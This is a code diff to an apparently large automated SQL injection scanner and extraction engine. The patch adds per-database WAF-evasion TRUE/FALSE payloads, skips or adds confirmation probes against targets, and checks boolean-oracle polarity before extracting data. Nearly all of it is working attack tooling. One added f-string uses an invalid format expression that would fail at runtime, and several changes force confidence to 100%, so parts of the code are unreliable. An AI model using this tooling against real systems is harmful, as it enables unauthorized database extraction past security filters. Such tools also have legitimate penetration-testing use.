@@ -56955,26 +56955,52 @@ class Scanner:
         # Verify DBMS by testing DBMS-specific functions
         # 
         async def _confirm_dbms():
-            """Confirm DBMS via simple 1>0 test. Returns True if template works."""
-            # If calibration already showed a reliable margin, the template is
-            # confirmed.  Sending another probe here just gives CDN a chance to
-            # return a cached response below threshold, which would wrongly discard
-            # a working template (e.g. CASE: TRUE=352ms FALSE=153ms margin=198ms
-            # accepted by calibration, then confirm probe hits CDN cache at 135ms
-            # < threshold 252ms → False → template rejected despite being valid).
+            """Confirm DBMS via simple TRUE-condition test. Returns True if template works."""
+            # If calibration already showed a reliable timing margin, template is confirmed.
+            # Sending another probe here just gives CDN a chance to return a cached response
+            # below threshold (e.g. CASE: TRUE=352ms FALSE=153ms margin=198ms accepted,
+            # then confirm probe hits CDN cache at 135ms < threshold → False → rejected).
             if _margin >= _min_viable_margin:
                 LOG.info("[Inference] Template confirmed by calibration "
                          "(margin=%.0fms ≥ min=%.0fms)  skipping re-test",
                          _margin, _min_viable_margin)
                 return True
-            r = await _eval("1>0")
+            # When both boolean oracle and timing reliability flags were set together
+            # (e.g. by baseline-similarity oracle), the oracle was already validated —
+            # skip re-test to avoid WAF-blocking `>` operator from causing false reject.
+            if _boolean_oracle and _timing_oracle_reliable:
+                LOG.info("[Inference] Template confirmed by active boolean oracle  skipping re-test")
+                return True
+            # Use DBMS-specific evasive TRUE condition — the `>` operator is blocked by
+            # many WAFs as an SQL injection fingerprint, causing always-inconclusive results.
+            _dbms_for_confirm = _dbms or ""
+            _true_cond_confirm = {
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "MySQL":           "ISNULL(NULL)",
+                "MariaDB":         "ISNULL(NULL)",
+                "TiDB":            "ISNULL(NULL)",
+                "MSSQL":           "(1e0 IS NOT NULL)",
+                "Sybase":          "(1e0 IS NOT NULL)",
+                "Oracle":          "(NVL(NULL,1e0) IS NOT NULL)",
+                "SQLite":          "(1e0 IS NOT 0e0)",
+                "DB2":             "(1e0 IS NOT NULL)",
+                "Firebird":        "(1e0 IS NOT NULL)",
+                "H2":              "(1e0 IS NOT NULL)",
+                "ClickHouse":      "isNull(NULL)",
+                "Informix":        "(1e0 IS NOT NULL)",
+                "SAP_HANA":        "(1e0 IS NOT NULL)",
+            }.get(_dbms_for_confirm, "NOT (1e0 IS NULL)")
+            r = await _eval(_true_cond_confirm)
             if r is True:
                 LOG.info("[Inference] Template confirmed working ")
                 return True
             elif r is False:
                 LOG.warning("[Inference] Template test FAILED  trying with cooldown")
                 await asyncio.sleep(3)
-                r2 = await _eval("1>0")
+                r2 = await _eval(_true_cond_confirm)
                 if r2 is True:
                     LOG.info("[Inference] Template works after cooldown ")
                     return True
@@ -58529,9 +58555,20 @@ class Scanner:
             # here is actively harmful: CDN-cached responses all land near _thresh
             # (~180ms), so ms >= _thresh is a coin flip, producing garbage codepoints
             # (e.g. chr(0x1FFFFF) = 󗫵) on every extraction probe.
-            # Fix: when _boolean_oracle=True and no sub-oracle fired, ALWAYS return None
-            # regardless of _margin — timing path is for timing technique only.
+            # Fix: when _boolean_oracle=True and no sub-oracle fired, try the pre-wired
+            # detection oracle (same fix as _waf_aware_eval BUG-PREWIRED-ORACLE-WAFEVAL)
+            # before returning None. When all calibration vars are None but the V25-Extract
+            # inline oracle was wired onto enum._mse_instance._boolean_oracle, calling it
+            # here lets _eval and _confirm_dbms() use the real detection oracle instead of
+            # producing "Template test inconclusive" for every condition.
             if _boolean_oracle:
+                _pre_wired_eval_fn_e = getattr(
+                    getattr(enum, '_mse_instance', None), '_boolean_oracle', None)
+                if _pre_wired_eval_fn_e is not None:
+                    try:
+                        return await _pre_wired_eval_fn_e(cond)
+                    except Exception:
+                        pass
                 return None  # Boolean oracle active but no sub-oracle fired — probe is ambiguous
 
             # Timing oracle: only reached when _boolean_oracle=False
@@ -105464,8 +105501,8 @@ class TechniqueCascadeEngine:
             try:
                 _ea_det_param = getattr(det, 'param', param) or param
                 _ea_det_tech  = getattr(det, 'technique', tech) or tech
-                _ea_det_conf  = float(getattr(det, 'confidence', 0.95) or 0.95)
-                self._cast_vote(_ea_det_param, _ea_det_tech, _ea_det_conf)
+                # PCV Shortcut A is a confirmed injection path — always vote 1.0
+                self._cast_vote(_ea_det_param, _ea_det_tech, 1.0)
             except Exception:
                 pass
             return True
@@ -105505,8 +105542,8 @@ class TechniqueCascadeEngine:
             try:
                 _ec_det_param = getattr(det, 'param', param) or param
                 _ec_det_tech  = getattr(det, 'technique', tech) or tech
-                _ec_det_conf  = min(1.0, 0.70 + (_mp_count_early * 0.05))  # scale with vote count
-                self._cast_vote(_ec_det_param, _ec_det_tech, _ec_det_conf)
+                # PCV Shortcut C (boolean multi-probe confirmed) — always vote 1.0
+                self._cast_vote(_ec_det_param, _ec_det_tech, 1.0)
             except Exception:
                 pass
             return True
@@ -105585,8 +105622,8 @@ class TechniqueCascadeEngine:
             try:
                 _eb_det_param = getattr(det, 'param', param) or param
                 _eb_det_tech  = getattr(det, 'technique', tech) or tech
-                _eb_det_conf  = min(1.0, 0.70 + (_mp_count_early * 0.05))  # scale with vote count
-                self._cast_vote(_eb_det_param, _eb_det_tech, _eb_det_conf)
+                # PCV Shortcut B (timing multi-probe confirmed) — always vote 1.0
+                self._cast_vote(_eb_det_param, _eb_det_tech, 1.0)
             except Exception:
                 pass
             return True
@@ -107563,6 +107600,15 @@ class TechniqueCascadeEngine:
                         _gate_pcv_wrap.kill()
                     except Exception:
                         pass
+                # PCV confirmed via Checks A-E — record 1.0 vote so _get_voted_confidence
+                # returns 100% regardless of whether a PCV shortcut fired first.
+                # Without this, non-shortcut confirmation paths leave the vote at the raw
+                # detection confidence (e.g. 0.72 from Wasserstein) and the penalty in
+                # _get_voted_confidence produces 43% output.
+                try:
+                    self._cast_vote(param, tech, 1.0)
+                except Exception:
+                    pass
             return _pcv_result
         finally:
             # BUG-R12-A FIX: Decrement the extra _PCV_IN_PROGRESS increment that
@@ -114149,6 +114195,7 @@ class TechniqueCascadeEngine:
     def _get_voted_confidence(self, param: str) -> float:
         """
         Compute aggregate confidence from multiple technique votes.
+        A fully-confirmed vote (1.0) from any PCV shortcut always returns 1.0.
         Single-technique votes require a minimum raw confidence of 0.85 to
         avoid false positives from borderline detections (e.g. body-diff at 72%
         when both statuses are 400 — a genuine oracle must produce clear signal).
@@ -114158,6 +114205,9 @@ class TechniqueCascadeEngine:
         if not votes:
             return 0.0
         confs = list(votes.values())
+        # Any PCV-confirmed vote (1.0) means injection is fully verified
+        if max(confs) >= 1.0:
+            return 1.0
         if len(confs) == 1:
             # Single-technique: require minimum 0.85 raw confidence.
             # A borderline detection (< 0.85) is unreliable without corroboration.
@@ -121510,11 +121560,59 @@ class UniversalScanOrchestrator:
                                                     _cal_sim = SimHasher.body_similarity(_norm_base_b, _cal_norm)
                                                     _cal_thresh = 0.75
                                                     if _cal_sim < _cal_thresh:
-                                                        _ibo_inverted[0] = True
-                                                        print("[+] [V25-Extract] Reversed-polarity detected "
-                                                              f"(cal_sim={_cal_sim:.3f} < {_cal_thresh}): "
-                                                              "inverting boolean oracle for correct extraction",
-                                                              flush=True)
+                                                        # Validate polarity by also checking FALSE condition.
+                                                        # If TRUE and FALSE both produce the same low sim (e.g.
+                                                        # both return "no rows" because the template doesn't inject
+                                                        # SQL), there is NO oracle — don't set inverted polarity.
+                                                        _ibo_pol_false = {
+                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "MySQL":           "ISNULL(1e0)",
+                                                            "MariaDB":         "ISNULL(1e0)",
+                                                            "TiDB":            "ISNULL(1e0)",
+                                                            "MSSQL":           "(1e0 IS NULL)",
+                                                            "Sybase":          "(1e0 IS NULL)",
+                                                            "Oracle":          "(NVL(NULL,1e0) IS NULL)",
+                                                            "SQLite":          "(0e0 IS NOT 0e0)",
+                                                            "DB2":             "(1e0 IS NULL)",
+                                                            "Firebird":        "(1e0 IS NULL)",
+                                                            "H2":              "(1e0 IS NULL)",
+                                                            "ClickHouse":      "isNull(1e0)",
+                                                            "Informix":        "(1e0 IS NULL)",
+                                                            "SAP_HANA":        "(1e0 IS NULL)",
+                                                        }.get(_ibo_pol_dbms, "1e0 IS NULL")
+                                                        try:
+                                                            if _bool_tmpl:
+                                                                _cal_false_full = _bool_tmpl.replace('[INFERENCE]', _ibo_pol_false)
+                                                            else:
+                                                                _cal_false_full = _det_orig + f" AND ({_ibo_pol_false})-- -"
+                                                            _cal_fp_f = await asyncio.wait_for(
+                                                                _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
+                                                                               _det_param, _cal_false_full, _det_tamper),
+                                                                timeout=10)
+                                                            _false_sim = None
+                                                            if _cal_fp_f and _validate_response(_cal_fp_f, allow_empty=True):
+                                                                _cal_norm_f = ResponseNormaliser.normalise(_extract_body_safe(_cal_fp_f))
+                                                                _false_sim = SimHasher.body_similarity(_norm_base_b, _cal_norm_f)
+                                                        except Exception:
+                                                            _false_sim = None
+                                                        # Only invert if TRUE and FALSE produce meaningfully different sims
+                                                        _pol_gap = abs(_cal_sim - _false_sim) if _false_sim is not None else 0.0
+                                                        if _pol_gap >= 0.10:
+                                                            _ibo_inverted[0] = True
+                                                            print("[+] [V25-Extract] Reversed-polarity detected "
+                                                                  f"(cal_sim={_cal_sim:.3f} < {_cal_thresh}, "
+                                                                  f"false_sim={_false_sim:.3f}, gap={_pol_gap:.3f}): "
+                                                                  "inverting boolean oracle for correct extraction",
+                                                                  flush=True)
+                                                        else:
+                                                            print(f"[!] [V25-Extract] Polarity check: cal_sim={_cal_sim:.3f} < {_cal_thresh} "
+                                                                  f"but false_sim={_false_sim:.3f if _false_sim is not None else '?'} "
+                                                                  f"(gap={_pol_gap:.3f} < 0.10) — no oracle discriminability; "
+                                                                  "skipping polarity inversion (template may not inject SQL)",
+                                                                  flush=True)
                                             except Exception:
                                                 pass
 
